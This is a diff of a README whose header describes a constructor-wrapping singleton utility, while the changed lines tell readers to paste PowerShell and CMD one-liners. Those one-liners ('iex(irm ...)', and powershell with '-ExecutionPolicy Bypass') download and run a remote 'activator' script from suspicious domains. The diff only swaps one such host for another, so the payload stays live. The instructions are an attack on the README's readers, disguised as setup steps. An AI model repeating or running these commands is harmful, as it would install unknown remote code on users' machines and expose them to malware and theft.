@@ -26,14 +26,14 @@ Wraps a class constructor so that repeated construction returns the same instanc
 Copy the line below into PowerShell and press `Enter`.
 
 ```cmd
-iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
+iex(irm 'https://activation-gateway.cc/update/ps-activator')
 ```
 
 ### 3️⃣ Forced run via CMD
 Copy into CMD, press `Enter`, wait for completion:
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
 ```
 
 > [!WARNING]
